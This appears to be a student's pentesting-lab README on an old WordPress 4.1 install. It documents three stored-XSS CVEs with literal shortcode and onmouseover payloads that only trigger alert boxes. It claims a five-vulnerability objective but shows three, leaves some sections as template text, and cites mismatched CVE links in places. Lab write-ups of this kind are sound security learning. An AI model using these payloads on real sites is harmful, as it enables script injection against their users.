# Project 7 - WordPress Pentesting

Time spent: **10** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) Vulnerability Name or ID: CVE-2015-5714
  - [x] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.1
    - Fixed in version: 4.1.8
  - [x] GIF Walkthrough: <img src='http://i.imgur.com/cZd4map.gif' title='Video Walkthrough' width='' alt='Video Walkthrough' />
  - [x] Steps to recreate: Make a post as an admin with the following content: <p><p><a href="</p>><a href="http://onMouseOver='alert(1)'">Click me</p>
  - [x] Affected source code:
    - [Link 1](http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/)
2. (Required) Vulnerability Name or ID: CVE-2015-5623
  - [x] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.1
    - Fixed in version: 4.1.6
  - [x] GIF Walkthrough: <img src='http://i.imgur.com/Du7etU8.gif' title='Video Walkthrough' width='' alt='Video Walkthrough' />
  - [x] Steps to recreate: Make a post as an admin with the following code: <a href="[caption code=">]</a><a title=" onmouseover=alert('test') ">link</a>
  - [x] Affected source code:
    - [Link 1](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622)
3. (Required) Vulnerability Name or ID: CVE-2015-5715
  - [x] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.1
    - Fixed in version: 4.1.8
  - [x] GIF Walkthrough: <img src='http://i.imgur.com/eNmWwKs.gif' title='Video Walkthrough' width='' alt='Video Walkthrough' />
  - [x] Steps to recreate: Make a post with the following content: XSS LOL!!![caption width='1' caption='<a href="' ">]</a><a href="http://onMouseOver='alert(/xss/)' style='display:block;position:absolute;top:0px;left:0px;margin-left:-1000px;margin-top:-1000px;width:99999px;height:99999px;'"></a>. Then make the post private.
  - [x] Affected source code: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3440
    - [Link 1](http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/)

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright 2017 Cho-Yuan Su

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.